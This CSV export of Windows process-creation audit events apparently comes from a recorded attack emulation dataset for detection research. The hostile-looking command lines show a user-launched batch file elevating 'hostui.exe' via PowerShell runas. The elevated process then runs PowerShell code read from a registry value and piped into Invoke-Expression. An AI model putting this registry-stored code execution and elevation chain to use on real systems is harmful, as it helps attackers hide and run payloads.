timestamp,Category,Channel,CommandLine,EventID,EventReceivedTime,EventTime,EventType,ExecutionProcessID,Hostname,Keywords,MandatoryLabel,Message,NewProcessId,NewProcessName,Opcode,OpcodeValue,ParentProcessName,ProcessId,ProviderGuid,RecordNumber,Severity,SeverityValue,SourceModuleName,SourceModuleType,SourceName,SubjectDomainName,SubjectLogonId,SubjectUserName,SubjectUserSid,TargetDomainName,TargetLogonId,TargetUserName,TargetUserSid,Task,ThreadID,TokenElevationType,Version,host,port,tags
2020-05-02T03:21:18.664Z,Process Creation,security,"C:\windows\system32\cmd.exe /c """"C:\Windows\System32\hostui.bat"" """,4688,2020-05-01 23:21:18,2020-05-01 23:21:19,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe3c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1808
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	C:\windows\system32\cmd.exe /c """"C:\Windows\System32\hostui.bat"" ""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",E3C,C:\Windows\System32\cmd.exe,Info,0,C:\Windows\explorer.exe,1808,{54849625-5478-4994-A5BA-3E3B0328C30D},93088,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,384,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:18.665Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:21:18,2020-05-01 23:21:19,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x6b8
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xe3c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",6B8,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\cmd.exe,E3C,{54849625-5478-4994-A5BA-3E3B0328C30D},93090,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,384,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:19.896Z,Process Creation,security,"powershell.exe  -c ""Start-Process C:\Windows\System32\hostui.exe -verb runas""",4688,2020-05-01 23:21:19,2020-05-01 23:21:19,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb08
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xe3c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell.exe  -c ""Start-Process C:\Windows\System32\hostui.exe -verb runas""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",B08,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Info,0,C:\Windows\System32\cmd.exe,E3C,{54849625-5478-4994-A5BA-3E3B0328C30D},93498,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,380,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:21.026Z,Process Creation,security,-c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty,4688,2020-05-01 23:21:21,2020-05-01 23:21:20,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Process Information:
	New Process ID:		0xd78
	New Process Name:	C:\Windows\System32\wlrmdr.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x14dc
	Creator Process Name:	C:\Windows\System32\winlogon.exe
	Process Command Line:	 -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",D78,C:\Windows\System32\wlrmdr.exe,Info,0,C:\Windows\System32\winlogon.exe,14DC,{54849625-5478-4994-A5BA-3E3B0328C30D},93699,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,13312,4076,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:22.160Z,Process Creation,security,C:\windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc,4688,2020-05-01 23:21:22,2020-05-01 23:21:22,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x6bc
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",6BC,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},93723,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,380,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:23.334Z,Process Creation,security,C:\windows\System32\svchost.exe -k wsappx -p -s ClipSVC,4688,2020-05-01 23:21:23,2020-05-01 23:21:22,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1198
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\System32\svchost.exe -k wsappx -p -s ClipSVC

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1198,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},93833,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,188,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:27.762Z,Process Creation,security,C:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,4688,2020-05-01 23:21:27,2020-05-01 23:21:26,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x20c0
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",20C0,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},94038,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,380,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:27.764Z,Process Creation,security,consent.exe 8384 306 000001E691026060,4688,2020-05-01 23:21:27,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x20dc
	New Process Name:	C:\Windows\System32\consent.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x20c0
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	consent.exe 8384 306 000001E691026060

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",20DC,C:\Windows\System32\consent.exe,Info,0,C:\Windows\System32\svchost.exe,20C0,{54849625-5478-4994-A5BA-3E3B0328C30D},94044,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4076,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.716Z,Process Creation,security,"""C:\Windows\System32\hostui.exe""",4688,2020-05-01 23:21:27,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-12288,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x1305DC

Process Information:
	New Process ID:		0x2104
	New Process Name:	C:\Windows\System32\hostui.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xb08
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\System32\hostui.exe"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2104,C:\Windows\System32\hostui.exe,Info,0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,B08,{54849625-5478-4994-A5BA-3E3B0328C30D},94104,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,DMEVALS,1305DC,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,13312,380,%%1937,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.716Z,Process Creation,security,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc,4688,2020-05-01 23:21:27,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x210c
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",210C,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},94118,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4076,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.717Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:21:27,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-12288,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x1305DC

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2144
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0x2104
	Creator Process Name:	C:\Windows\System32\hostui.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2144,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\hostui.exe,2104,{54849625-5478-4994-A5BA-3E3B0328C30D},94132,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,1305DC,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,96,%%1937,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.719Z,Process Creation,security,C:\windows\system32\svchost.exe -k netsvcs -p -s seclogon,4688,2020-05-01 23:21:28,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2168
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k netsvcs -p -s seclogon

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",2168,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},94149,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,96,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.721Z,Process Creation,security,"powershell.exe -c ""Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' | Invoke-Expression""",4688,2020-05-01 23:21:28,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Process Information:
	New Process ID:		0x218c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x2104
	Creator Process Name:	C:\Windows\System32\hostui.exe
	Process Command Line:	powershell.exe -c ""Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' | Invoke-Expression""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",218C,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Info,0,C:\Windows\System32\hostui.exe,2104,{54849625-5478-4994-A5BA-3E3B0328C30D},94169,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,13312,4076,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:21:31.721Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:21:28,2020-05-01 23:21:27,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x13069A

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x21a4
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x218c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",21A4,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,218C,{54849625-5478-4994-A5BA-3E3B0328C30D},94173,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,13069A,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,96,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
